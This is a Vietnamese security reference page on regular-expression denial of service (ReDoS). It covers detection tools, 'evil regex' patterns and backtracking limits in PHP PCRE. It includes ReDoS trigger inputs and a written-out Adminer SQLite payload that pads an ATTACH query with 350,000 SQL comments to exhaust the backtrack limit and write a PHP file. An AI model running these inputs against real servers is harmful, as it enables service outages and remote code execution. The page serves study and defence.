# Regular Expression

> Regular Expression Denial of Service (ReDoS) là một dạng tấn công khai thác thực tế rằng một số regular expression có thể mất thời gian cực kỳ lâu để xử lý, khiến ứng dụng hoặc dịch vụ không phản hồi hoặc bị crash.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)

  * [Evil Regex](#evil-regex)
  * [Giới hạn Backtrack](#backtrack-limit)
* [Tài liệu tham khảo](#references)

## Công cụ

* https://github.com/tjenkinson/redos-detector - CLI và thư viện kiểm tra với độ chắc chắn liệu một regex pattern có an toàn trước các cuộc tấn công ReDoS hay không. Được hỗ trợ trên trình duyệt, Node và Deno.
* https://github.com/doyensec/regexploit - Tìm các regular expression có khả năng tồn tại lỗ hổng ReDoS (Regular Expression Denial of Service).
* [devina.io/redos-checker](https://devina.io/redos-checker) - Kiểm tra các regular expression để tìm những lỗ hổng Denial of Service tiềm ẩn.

## Phương pháp

### Evil Regex

Evil Regex chứa:

* Grouping kết hợp với repetition
* Bên trong group được lặp lại:

  * Repetition
  * Alternation có sự chồng lấn

**Ví dụ**:

* `(a+)+`
* `([a-zA-Z]+)*`
* `(a|aa)+`
* `(a|a?)+`
* `(.*a){x}` với x > 10

Các regular expression này có thể bị khai thác bằng `aaaaaaaaaaaaaaaaaaaaaaaa!` (20 ký tự 'a' theo sau bởi một ký tự '!').

```ps1
aaaaaaaaaaaaaaaaaaaa! 
```

Với input này, regex engine sẽ thử tất cả các cách có thể để nhóm các ký tự `a` trước khi nhận ra rằng việc match cuối cùng thất bại do ký tự `!`. Điều này dẫn đến sự bùng nổ số lượng lần thử backtracking.

### Giới hạn Backtrack

Backtracking trong regular expression xảy ra khi regex engine cố gắng match một pattern và gặp phải mismatch. Sau đó, engine sẽ quay ngược về vị trí match trước đó và thử một nhánh thay thế để tìm cách match. Quá trình này có thể được lặp lại rất nhiều lần, đặc biệt với các pattern phức tạp và chuỗi input lớn.

**Các tùy chọn cấu hình PHP PCRE**:

| Name                 | Default | Note                     |
| -------------------- | ------- | ------------------------ |
| pcre.backtrack_limit | 1000000 | 100000 for `PHP < 5.3.7` |
| pcre.recursion_limit | 100000  | /                        |
| pcre.jit             | 1       | /                        |

Đôi khi có thể buộc regex vượt quá 100 000 lần recursion, dẫn đến ReDOS và khiến `preg_match` trả về `false`:

```php
$pattern = '/(a+)+$/';
$subject = str_repeat('a', 1000) . 'b';

if (preg_match($pattern, $subject)) {
    echo "Match found";
} else {
    echo "No match";
}
```

**Trường hợp thực tế: Adminer SQLite RCE**:

Adminer sử dụng regular expression để ngăn các SQLite query bắt đầu bằng ATTACH:

```php
$pattern = "~^(?:\\s|/\\*[\s\S]*?\\*/|(?:#|--)[^\n]*\n?|--\r?\n)*+ATTACH\\b~i";
if(preg_match($pattern, $query, $match)){
 die('error');
}
```

Việc kiểm tra xử lý cả `0` (không match) và `false` (đánh giá regular expression thất bại) như một query được phép. Kẻ tấn công có thể thêm hàng trăm nghìn SQL comment rỗng vào trước một query `ATTACH`:

```php
<?php
$payload = <<<'SQL'
ATTACH DATABASE 'lol.php' AS lol;
CREATE TABLE lol.pwn (data text);
INSERT INTO lol.pwn (data) VALUES ('<?php phpinfo(); ?>');
SQL;

echo str_repeat("--\n", 350000) . $payload;
```

Việc xử lý các comment đã làm cạn giới hạn backtracking của PHP PCRE. `preg_match()` trả về `false`, nhưng ứng dụng lại nhầm giá trị này với trạng thái không match hợp lệ. Do đó, query `ATTACH` vốn bị chặn cuối cùng vẫn được thực thi.

## Tài liệu tham khảo

* [Intigriti Challenge 1223 - Hackbook Of A Hacker - December 21, 2023](https://web.archive.org/web/20260210185049/https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)
* [MyBB Admin Panel RCE CVE-2023-41362 - SorceryIE - September 11, 2023](https://web.archive.org/web/20251115110845/https://blog.sorcery.ie/posts/mybb_acp_rce/)
* [OWASP Validation Regex Repository - OWASP - March 14, 2018](https://web.archive.org/web/20241005224013/https://wiki.owasp.org/index.php/OWASP_Validation_Regex_Repository)
* [PCRE > Installing/Configuring - PHP Manual - May 3, 2008](https://web.archive.org/web/20260219065508/https://www.php.net/manual/en/pcre.configuration.php)
* [Regular expression Denial of Service - ReDoS - Adar Weidman - December 4, 2019](https://web.archive.org/web/20200309080846/https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
